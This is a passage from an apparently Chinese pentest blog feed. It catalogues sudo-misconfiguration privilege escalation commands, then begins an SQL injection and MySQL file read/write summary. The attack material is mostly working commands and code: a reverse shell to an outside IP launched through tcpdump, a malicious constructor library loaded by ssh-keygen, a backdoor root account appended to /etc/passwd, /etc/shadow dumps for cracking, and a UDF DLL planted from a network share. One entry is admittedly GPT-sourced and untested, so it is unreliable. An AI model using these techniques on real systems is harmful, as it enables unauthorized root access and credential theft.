<br></code></pre></td></tr></table></figure><ul><li>本身就是终端 所以直接sudo 起一个就行 tmux同理</li></ul><h3 id="sudo-script"><a href="#sudo-script" class="headerlink" title="sudo script"></a>sudo script</h3><ul><li>sudo -l | grep script</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/script</span> <br></code></pre></td></tr></table></figure><ul><li><p>sudo script -q &#x2F;dev&#x2F;null</p></li><li><p>提权成功</p></li><li><p>script本来就是启动新的shell会话，然后记录shell所有命令记录</p></li><li><p>不过需要-q是因为 如果没有的话会有记录开始和结束的消息 不过记录要丢掉，以防被发现</p></li></ul><h3 id="sudo-sed"><a href="#sudo-sed" class="headerlink" title="sudo sed"></a>sudo sed</h3><ul><li>sudo -l | grep sed</li><li>sudo sed -n ‘1e exec bash 1&gt;&amp;0’ &#x2F;etc&#x2F;hosts</li><li>提权成功</li><li>sed是一个文本处理工具</li><li>-n是sed的一个选项，用于不自动打印，sed默认会打印每一行</li><li>‘1e exec bash 1&gt;&amp;0’:这是sed的命令部分。1e告诉sed在处理到第一行后执行e命令。e命令让sed执行后面的命令，并把执行结果插入到原文本流中。这里的exec bash 1&gt;&amp;0 实际上会启动一个新的bash shell，并将标准输出（1）重定向到文件描述符0，也就是当前的标准输入。</li><li>&#x2F;etc&#x2F;hosts是你要处理的文件，可以使用任何非空文件</li></ul><h3 id="sudo-service"><a href="#sudo-service" class="headerlink" title="sudo service"></a>sudo service</h3><ul><li>sudo -l | grep service</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/sbin/service</span> <br></code></pre></td></tr></table></figure><ul><li><p>sudo service ..&#x2F;..&#x2F;bin&#x2F;bash</p></li><li><p>提权成功</p></li><li><p>将bash作为服务启动</p></li><li><p>..&#x2F;..&#x2F;是在服务的路径搜索中($PATH中的)父父级路径应该就能搜到bash</p></li><li><p>如果&#x2F;bin&#x2F;bash不是服务</p><ul><li>创建伪服务</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash\n/bin/bash&#x27;</span> &gt; /tmp/fake_service<br><span class="hljs-built_in">chmod</span> +x /tmp/fake_service<br></code></pre></td></tr></table></figure><ul><li>使用sudo service启动这个脚本</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> service /tmp/fake_service start<br></code></pre></td></tr></table></figure><ul><li>内容来源于gpt 未曾实践</li></ul><h3 id="sudo-socat"><a href="#sudo-socat" class="headerlink" title="sudo socat"></a>sudo socat</h3><ul><li>sudo -l | grep socat</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/socat<br></code></pre></td></tr></table></figure><ul><li><p>sudo socat stdin exec:&#x2F;bin&#x2F;bash</p></li><li><p>提权成功 但是交互性较低</p></li><li><p>socat 是一个网络工具，用于建立双向的数据传输通道</p></li><li><p>stdin是标准输入 ，通常指的是从键盘输入到程序的数据</p></li><li><p>exec:&#x2F;bin&#x2F;bash 就是被执行的命令</p></li></ul><h3 id="sudo-ssh"><a href="#sudo-ssh" class="headerlink" title="sudo ssh"></a>sudo ssh</h3><ul><li>sudo -l | grep ssh</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/ssh<br></code></pre></td></tr></table></figure><ul><li><p>sudo ssh -o ProxyCommand&#x3D;’;bash 0&lt;&amp;2 1&gt;&amp;2’ x</p></li><li><p>提权成功</p></li><li><p>-o ProxyCommand是SSH的一个选项，一般用于通过一个代理服务器链接到远程主机 x处可以使任意字符</p></li><li><p>ssh试图用这个bash实例作为他的通道 但是这个bash实例的输入输出已经被重定向到了stderr</p></li><li><p>在ProxyCommand中加入了一个分号时，实际上是先执行一个空命令，然后再执行bash 0&lt;&amp;2 1&gt;&amp;2</p></li><li><p>这种情况下，ssh会连接到这个空命令的输入输出，因为这个空命令没有重定向，所以ssh能够正常的通过这个空命令连接到目标主机</p></li></ul><h3 id="sudo-ssh-keygen"><a href="#sudo-ssh-keygen" class="headerlink" title="sudo ssh-keygen"></a>sudo ssh-keygen</h3><ul><li>sudo -l | grep ssh-keygen</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/ssh-keygen<br></code></pre></td></tr></table></figure><ul><li>vim lib.c</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">inject</span><span class="hljs-params">()</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((constructor))</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">inject</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">gcc -<span class="hljs-keyword">shared</span> -fPIC -o <span class="hljs-keyword">lib</span>.so <span class="hljs-keyword">lib</span>.c<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ssh-keygen -D ./lib.so<br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>c代码中，定义了一个静态函数，它使用一个属性，该属性会告诉编译器，程序加载时自动执行该函数。</p></li><li><p>-D：这是ssh-keygen工具的一个选项。-D用于指定一个动态链接库文件，该文件将被ssh-keygen加载和使用。</p></li><li><p>库文件搜索路径一般是被指定了环境变量的，所以要加上.&#x2F;，这样才能指定搜索当前目录下的库文件去使用。</p></li></ul><h3 id="sudo-strace"><a href="#sudo-strace" class="headerlink" title="sudo strace"></a>sudo strace</h3><ul><li>sudo -l | grep strace</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/strace</span> <br></code></pre></td></tr></table></figure><ul><li><p>sudo strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;bash</p></li><li><p>提权成功</p></li><li><p>strace：这是一个Linux命令，他的功能是追踪和记录另一个进程（这里是&#x2F;bin&#x2F;bash）的系统调用和接收到的信号。这对于调试和理解程序的运行方式非常有用。</p></li><li><p>-o &#x2F;dev&#x2F;null：这是把strace的输出重定向到&#x2F;dev&#x2F;null</p></li><li><p>改文件是一个特殊的文件，他会丢弃所有写入到他的数据</p></li></ul><h3 id="sudo-systemctl"><a href="#sudo-systemctl" class="headerlink" title="sudo systemctl"></a>sudo systemctl</h3><ul><li>sudo -l | grep systemctl</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/systemctl<br></code></pre></td></tr></table></figure><ul><li><p>sudo systemctl</p></li><li><p>!&#x2F;bin&#x2F;bash </p></li><li><p>提权成功</p></li></ul><h3 id="sudo-tcpdump"><a href="#sudo-tcpdump" class="headerlink" title="sudo tcpdump"></a>sudo tcpdump</h3><ul><li>sudo -l | grep tcpdump</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/sbin/tcpdump</span> <br></code></pre></td></tr></table></figure><ul><li><p>在kali端建立监听</p><ul><li>nc -lvnp 3333</li></ul></li><li><p>靶机中</p><ul><li>vi shell.sh</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mknod</span> RedteamNotes_pipe p &amp;&amp; /bin/nc 192.168.13.128 3333 0&lt;RedteamNotes_pipe |<br>/bin/bash 1&gt;RedteamNotes_pipe<br></code></pre></td></tr></table></figure><ul><li>chmod +x shell.sh</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> tcpdump -<span class="hljs-built_in">ln</span> -i eth0 -w /dev/null -W 1 -G 1 -z /home/user/shell.sh -Z root<br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>可以使用python提高交互性</p></li><li><p>mknod RedteamNotes_pipe p：这部分命令使用mknod工具创建了一个名为”RedteamNotes_pipe”的命名管道。命名管道是一种特殊的文件，用于进程间通信，其中一个进程可以将数据写入管道，而另一个进程可以从管道中读取数据。</p></li><li><p>p表示FIFO（First In First Out）类型</p></li><li><p>&amp;&amp;：是一个逻辑操作符，表示前一个命令执行成功之后才能执行下一个命令</p></li><li><p>0&lt;RedteamNotes_pipe：这是输入重定向。 （0代表标准输入）</p></li><li><p>1&gt;RedteamNotes_pipe：这是输出重定向。  （1代表标准输出）</p></li><li><p>可以通过mkfifo命令替代mknod</p></li><li><p>-ln：使用数字形式显示ip地址和端口号，不进行反向解析</p></li><li><p>-i：指定要监听的网络接口</p></li><li><p>-W 1：限制每个文件的大小为1，并在达到限制后进行切换</p></li><li><p>-G 1：在1秒后轮换到下一个文件</p></li><li><p>-z &#x2F;home&#x2F;user&#x2F;shell.sh：当切换到下一个文件时，执行&#x2F;home&#x2F;user&#x2F;shell.sh脚本</p></li><li><p>-Z root：将tcpdump进程的权限设定为root用户</p></li></ul><h3 id="sudo-tee"><a href="#sudo-tee" class="headerlink" title="sudo tee"></a>sudo tee</h3><ul><li>sudo -l |grep tee</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/tee</span>   <br></code></pre></td></tr></table></figure><ul><li><p>该操作有损</p></li><li><p>kali中</p></li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">openssl</span> passwd -<span class="hljs-number">1</span> -salt RedteamNotes <span class="hljs-string">&#x27;Ev!LP<span class="hljs-variable">@ss</span>&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$1$RedteamN$aR0LxuQB.RsKFpwdaKcAx1<br></code></pre></td></tr></table></figure><ul><li>vim passwd_new_entry</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">john:</span><span class="hljs-variable">$1</span><span class="hljs-variable">$RedteamN</span><span class="hljs-variable">$aR0LxuQB</span>.<span class="hljs-symbol">RsKFpwdaKcAx1:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br></code></pre></td></tr></table></figure><ul><li><p>靶机中</p><ul><li>RedteamNotes&#x3D;&#x2F;etc&#x2F;passwd</li></ul></li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">echo</span> <span class="hljs-string">&#x27;john:<span class="hljs-variable">$1</span><span class="hljs-variable">$RedteamN</span><span class="hljs-variable">$aR0LxuQB</span>.RsKFpwdaKcAx1:0:0:root:/root:/bin/bash&#x27;</span> | sudo tee -a <span class="hljs-string">&quot;<span class="hljs-variable">$RedteamNotes</span>&quot;</span><br></code></pre></td></tr></table></figure><ul><li><p>su john</p></li><li><p>提权成功</p></li><li><p>tee：这是一个将从输入中读取的数据写到文件并同时输出到标准输出的命令</p></li><li><p>-a：表示附加</p></li></ul><h3 id="sudo-timedatectl"><a href="#sudo-timedatectl" class="headerlink" title="sudo timedatectl"></a>sudo timedatectl</h3><ul><li>sudo -l | grep timedatectl</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/timedatectl</span> <br></code></pre></td></tr></table></figure><ul><li><p>sudo timedatectl</p></li><li><p>!&#x2F;bin&#x2F;bash</p></li><li><p>提权成功</p></li></ul><h3 id="sudo-tmux"><a href="#sudo-tmux" class="headerlink" title="sudo tmux"></a>sudo tmux</h3><ul><li>sudo -l | grep tmux</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/tmux</span>  <br></code></pre></td></tr></table></figure><ul><li><p>sudo tmux</p></li><li><p>提权成功</p></li></ul><h3 id="sudo-vi"><a href="#sudo-vi" class="headerlink" title="sudo vi"></a>sudo vi</h3><ul><li>sudo -l | grep vi</li><li>sudo vi -c ‘:!&#x2F;bin&#x2F;bash’ &#x2F;dev&#x2F;null</li><li>提权成功</li><li>-c：这是vi的一个选项，让vi在启动之后执行一个特定的命令</li><li>界面操作也一样 直接!&#x2F;bin&#x2F;bash</li></ul><h3 id="sudo-wall"><a href="#sudo-wall" class="headerlink" title="sudo wall"></a>sudo wall</h3><ul><li>sudo -l | grep wall</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/wall</span> <br></code></pre></td></tr></table></figure><ul><li><p>RedteamNotes&#x3D;&#x2F;etc&#x2F;shadow</p></li><li><p>sudo wall –nobanner “$RedteamNotes”</p></li><li><p>放到john解密</p></li><li><p>wall：这是一个广播消息的命令，可以发送一条消息到所有的打开的终端窗口，常用于系统管理员告知所有用户系统即将进行的操作，比如重启。</p></li><li><p>–nobanner：是一个参数，告诉wall不要在发送的消息上方添加默认的标题</p></li></ul><h3 id="sudo-watch"><a href="#sudo-watch" class="headerlink" title="sudo watch"></a>sudo watch</h3><ul><li>sudo -l | grep watch</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/watch</span>   <br></code></pre></td></tr></table></figure><ul><li><p>sudo watch -x bash -c ‘reset; exec bash 1&gt;&amp;0 2&gt;&amp;0’</p></li><li><p>提权成功</p></li><li><p>watch：是一个在linux系统上周期性执行命令并显示结果的程序。它默认每两秒执行一次指定的命令</p></li><li><p>以root的权限，每两秒刷新一次bash shell，并忽略所有的输出信息。</p></li></ul><h3 id="sudo-wget"><a href="#sudo-wget" class="headerlink" title="sudo wget"></a>sudo wget</h3><ul><li>sudo -l | grep wget</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/wget<br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">jackie<span class="hljs-variable">@RedteamNotes</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><span class="hljs-title class_">RedteamNotes</span>=<span class="hljs-variable">$(</span>mktemp)<br>jackie<span class="hljs-variable">@RedteamNotes</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>chmod +x <span class="hljs-variable">$RedteamNotes</span><br>jackie<span class="hljs-variable">@RedteamNotes</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>echo -e <span class="hljs-string">&#x27;#!/bin/bash\n/bin/bash 1&gt;&amp;0&#x27;</span> &gt; <span class="hljs-variable">$RedteamNotes</span><br>jackie<span class="hljs-variable">@RedteamNotes</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo wget --<span class="hljs-keyword">use</span>-askpass=<span class="hljs-variable">$RedteamNotes</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>-e是echo的一个选项，表示启用反斜线转义字符</p></li><li><p>–user-askpass：用于在需要密码的时候运行一个特定程序获取密码</p></li><li><p>0表示下载url为0的资源</p></li></ul><h3 id="sudo-zip"><a href="#sudo-zip" class="headerlink" title="sudo zip"></a>sudo zip</h3><ul><li>sudo -l |grep zip</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/zip</span>  <br></code></pre></td></tr></table></figure><ul><li><p>sudo &#x2F;usr&#x2F;bin&#x2F;zip foo &#x2F;etc&#x2F;hostname -T -TT ‘bash #’</p></li><li><p>提权成功</p></li><li><p>-T和-TT是选项。-T用于测试压缩文件完整性</p></li><li><p><strong><code>-TT &#39;bash #&#39;</code></strong>: <code>zip</code> 提供的一个特性，<code>-TT</code> 允许你指定一个命令，在执行测试时运行。这里是尝试通过 <code>bash</code> 命令执行提权操作。<code>bash #</code> 的 <code>#</code> 是注释符号，表示后面没有其他内容</p></li></ul><h3 id="sudo-xxd"><a href="#sudo-xxd" class="headerlink" title="sudo xxd"></a>sudo xxd</h3><ul><li>sudo xxd &#x2F;etc&#x2F;shadow | xxd -r</li><li>报错信息用john解密即可</li><li>xxd 读取敏感信息，然后反转</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入总结</title>
    <link href="/2024/09/30/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <url>/2024/09/30/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入-基础介绍"><a href="#SQL注入-基础介绍" class="headerlink" title="SQL注入(基础介绍)"></a>SQL注入(基础介绍)</h1><p><strong>数据库引擎本身不需要分号来标识语句结束</strong>，只要接收到的是完整的一条 SQL 语句，它就可以执行。</p><p>所以我们直接注释 忽略后面的语句，就直接不用管了</p><p>如果闭合不了 就直接猜测他的参数包围的构造 把后面的包围了就行</p><p>不过这个闭合经过测试，order by 是不支持这样的 但是union select 就可以这么用</p><h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><ul><li><p>一般–risk&#x3D;3 –level&#x3D;3即可</p></li><li><p>具体的使用 -help查看即可</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-attr">--batch</span> <span class="hljs-attr">--risk</span>=<span class="hljs-number">3</span> <span class="hljs-attr">--level</span>=<span class="hljs-number">3</span> <span class="hljs-attr">--random-agent</span>  常用命令<br><span class="hljs-attr">--read-file</span>=<span class="hljs-selector-tag">path</span>              读文件<br><span class="hljs-attr">--write-file</span>=<span class="hljs-selector-tag">path</span>             写文件<br><span class="hljs-attr">--flush-session</span>               刷新缓存<br><span class="hljs-attr">--data</span>=DATA                 指定注入点<br><span class="hljs-attr">--technique</span>= B/T/E              指定注入技术<br><span class="hljs-attr">--current-user</span>                当前用户<br><span class="hljs-attr">--current-db</span>                当前数据库<br><span class="hljs-attr">--passwords</span>                 数据库密码hash<br><span class="hljs-attr">--dbs</span>                   枚举数据库<br><span class="hljs-attr">--union-check</span>                 #是否支持 union 注入<br></code></pre></td></tr></table></figure></li><li><p>php下–os-shell原理</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">先上传一个文件上传文件<br>然后通过该脚本上传webshell<br></code></pre></td></tr></table></figure></li></ul><h2 id="mysql数据库版本特性"><a href="#mysql数据库版本特性" class="headerlink" title="mysql数据库版本特性"></a>mysql数据库版本特性</h2><ul><li>5.0之后 information_schema 出现</li><li>5.1之后 udf导入xx\lib\plugin\或xx\lib64\plugin\ 目录下<ul><li>mysql -uroot -proot123 -e “show variables like ‘plugin%’;”</li></ul></li><li>5.x之后 system执行命令<ul><li>system id</li></ul></li></ul><h2 id="mysql读写文件"><a href="#mysql读写文件" class="headerlink" title="mysql读写文件"></a>mysql读写文件</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">查看当前用户是否拥有File_priv权限 如果为YES则代表拥有<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>, host, File_priv <span class="hljs-keyword">FROM</span> mysql.user;<br>查看当前用户的secure_file_priv值是否不为<span class="hljs-keyword">NULL</span> 如果为空代表拥有全部权限 如果为特定目录则仅有该目录读写权限<br>但是即使该值为<span class="hljs-keyword">NULL</span> mysql仍有一个读取漏洞<br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@secure_file_priv</span>;<br><span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;secure_file_priv&#x27;</span>;<br>sqlmap使用 <span class="hljs-comment">--file-read path  --file-write path即可</span><br></code></pre></td></tr></table></figure><ul><li><p>当前用户的secure_file_priv属性的值不为NULL</p><ul><li>windows下的设置<ul><li>修改mysql.ini文件 在[mysqld]下添加条目 secure_file_priv&#x3D; 保存，重启mysql</li><li>可以结合任意文件读取去看该文件</li></ul></li><li>secure_file_priv为NULL表示不允许导入导出 5.7之后为默认值</li><li>secure_file_priv为指定文件夹 表示导入导出只能在该文件夹</li><li>secure_file_priv没有设置时，表示没有任何限制</li><li>linux下的设置<ul><li>&#x2F;etc&#x2F;my.cnf</li></ul></li></ul></li></ul><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><ul><li>mysql3.x读取方法</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">create <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">a</span>(cmd <span class="hljs-selector-tag">text</span>);<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">load</span> data infile <span class="hljs-string">&#x27;/etc/passwd&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> a;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">select</span> * <span class="hljs-selector-tag">from</span> <span class="hljs-selector-tag">a</span>;<br></code></pre></td></tr></table></figure><ul><li>mysql4.x读取方法</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">create <span class="hljs-selector-tag">table</span> <span class="hljs-selector-tag">a</span>(cmd <span class="hljs-selector-tag">text</span>);<br></code></pre></td></tr></table></figure><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">insert</span> <span class="hljs-variable">into</span> <span class="hljs-function"><span class="hljs-title">a</span>(<span class="hljs-variable">cmd</span>) <span class="hljs-title">values</span>(<span class="hljs-title">load_file</span>(<span class="hljs-string">&#x27;c:\\ddd\\ddd\\ddd.txt&#x27;</span>));</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">select</span> * <span class="hljs-selector-tag">from</span> <span class="hljs-selector-tag">a</span>;<br></code></pre></td></tr></table></figure><ul><li><p>5.x以上两种都可以</p></li><li><p>除上述方法还能使用load_file()、load data infile()、system cat 依据版本而定</p><ul><li><p>load_file()</p><ul><li>use thirdweek;</li></ul></li></ul></li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> read2_tb(word <span class="hljs-type">text</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> read2_tb(word) <span class="hljs-keyword">values</span> (load_file(<span class="hljs-string">&#x27;D:/test.txt&#x27;</span>));<br></code></pre></td></tr></table></figure><pre><code class="hljs">select * from read2_tb;</code></pre><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20240922115150173-1735730388294-1-5832854.png" alt="image-20240922115150173"></p><pre><code class="hljs">load_file()支持网络路径，如果你可以将dll复制到网络共享中 可以直接加载并写入磁盘</code></pre><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">select load_file(&#x27;<span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span>192.168.0.19<span class="hljs-symbol">\\</span>network<span class="hljs-symbol">\\</span>lib_mysqludf_sys_64.dll&#x27;) into dumpfile &quot;D:<span class="hljs-symbol">\\</span>MySQL<span class="hljs-symbol">\\</span>mysql-5.7.21-winx64<span class="hljs-symbol">\\</span>mysql-5.7.21-winx64<span class="hljs-symbol">\\</span>lib<span class="hljs-symbol">\\</span>plugin<span class="hljs-symbol">\\</span>udf.dll&quot;;<br></code></pre></td></tr></table></figure><ul><li>load data infile()</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">load</span> data infile <span class="hljs-string">&#x27;D:/test.txt&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> read2_tb;<br></code></pre></td></tr></table></figure><ul><li>secure_file_priv&#x3D;NULL下的文件读取方法</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> mysql.rd1 (code <span class="hljs-type">TEXT</span>);//创建表 用于临时存放数据<br><span class="hljs-keyword">LOAD</span> DATA <span class="hljs-keyword">LOCAL</span> INFILE <span class="hljs-string">&#x27;/root/.bash_history&#x27;</span> <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">TABLE</span> mysql.rd1 FIELDS TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;&#x27;</span>;//读取数据<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> mysql.rd1;//查看数据<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> mysql.rd1;//删除该表<br></code></pre></td></tr></table></figure><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><ul><li><p>write</p><ul><li>sqlmap 直接 os -shell 注意区分windows和linux</li></ul></li><li><p>快捷使用</p><ul><li>SELECT LOAD_FILE(‘d:\test.txt’); 可以进行16进制转码</li></ul></li><li><p>into outfile</p></li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">use thirdweek<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span 